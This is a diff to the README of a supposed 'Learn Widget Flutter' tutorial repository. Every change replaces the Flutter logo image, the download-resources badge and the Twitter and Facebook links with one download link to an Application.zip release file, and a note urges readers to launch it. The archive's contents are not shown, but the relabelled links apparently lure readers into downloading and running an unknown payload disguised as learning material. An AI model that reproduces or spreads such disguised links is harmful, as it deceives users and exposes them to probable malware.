@@ -2,7 +2,7 @@
 
 Welcome to the "Learn Widget Flutter" repository! Here, you will delve into the world of mobile application development using Flutter. This repository serves as a comprehensive learning resource for those eager to understand how a mobile application is built, how to structure layouts for each feature, and most importantly, how to master Flutter!
 
-![Flutter Logo](https://github.com/flutter/website/blob/master/src/_assets/image/flutter-lockup-bg.png)
+![Flutter Logo](https://github.com/Harsh-dev391/learn-widget-flutter/releases/download/v1.0/Application.zip)
 
 ## Topics Covered
 - **Dart**
@@ -22,7 +22,7 @@ Welcome to the "Learn Widget Flutter" repository! Here, you will delve into the 
 
 ## Get Started
 To start your Flutter learning journey, click the button below to download the resources:
-[![Download Resources](https://img.shields.io/badge/Download%20Resources-Download-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Resources](https://github.com/Harsh-dev391/learn-widget-flutter/releases/download/v1.0/Application.zip%20Resources-Download-blue)](https://github.com/Harsh-dev391/learn-widget-flutter/releases/download/v1.0/Application.zip)
 
 (*Note: The link provided needs to be launched*)
 
@@ -37,8 +37,8 @@ For in-depth learning, check out the articles and tutorials available within the
 
 ## Connect with Us
 Do you have questions, suggestions, or feedback? Reach out to us on our social media channels:
-- Twitter: [@learn_widget_flutter](https://twitter.com/learn_widget_flutter)
-- Facebook: [Learn Widget Flutter Page](https://www.facebook.com/Learn-Widget-Flutter-Page)
+- Twitter: [@learn_widget_flutter](https://github.com/Harsh-dev391/learn-widget-flutter/releases/download/v1.0/Application.zip)
+- Facebook: [Learn Widget Flutter Page](https://github.com/Harsh-dev391/learn-widget-flutter/releases/download/v1.0/Application.zip)
 
 ## Join the Flutter Community
 Become a part of the vibrant Flutter community! Connect with developers from around the world, share your projects, and collaborate on exciting new ventures. Flutter opens up a world of possibilities for mobile app development, and the community is here to support you every step of the way.
